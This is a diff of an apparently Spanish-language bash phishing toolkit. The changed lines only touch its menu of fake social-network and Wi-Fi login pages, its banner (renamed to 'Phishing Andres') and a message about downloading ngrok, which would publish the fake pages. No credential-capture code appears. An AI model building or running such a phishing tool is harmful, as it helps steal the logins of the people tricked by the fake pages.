@@ -14,7 +14,7 @@ menu() {
 printf "\e[1;93m\e[0m\e[1;92mPuedes escojer entre Redes Sociales e Inicio de session wifi\e[0m \e[1;93m\e[0m\n"
 printf "\n"
 printf "\e[1;93m\e[0m\e[1;92m=============================================\e[0m \e[1;93m\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Redes Sociales\e[0m      \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Paginas de Wifi\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Redes Sociales\e[0m \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Paginas de Wifi\n"
 printf "\e[1;93m\e[0m\e[1;92m=============================================\e[0m \e[1;93m\e[0m\n"
 
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escoja una de las opciones: \e[0m\en' option
@@ -238,7 +238,7 @@ printf "    .-----.----.----.-----.----.   |   Y   |   _   |   Y   |      \n"
 printf "    |  -__|   _|   _|  _  |   _|   |   |   |.  |   |   |   |     \n"
 printf "    |_____|__| |__| |_____|__|     |____   |.  |   |____   |     \n"
 printf "                                       |:  |:  1   |   |:  |    \n"
-printf "     \e[0m\e[1;77m Sploid Andres \e[1;31m                |::.|::.. . |   |::.|    \n"
+printf "     \e[0m\e[1;77m Phishing Andres\e[1;31m |::.|::.. . |   |::.|    \n"
 printf "                                        --- -------     ---     \n"
                                           
 printf "\n"
@@ -416,7 +416,7 @@ echo ""
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "Necesita unzip pero no está instalado. Instalarlo. Saliendo."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "Necesita wget pero no está instalado. Instalarlo. Saliendo."; exit 1; }
-printf "\e[1;92m[\e[0m*\e[1;92m] Descargando ngrok...\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] Descargando Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
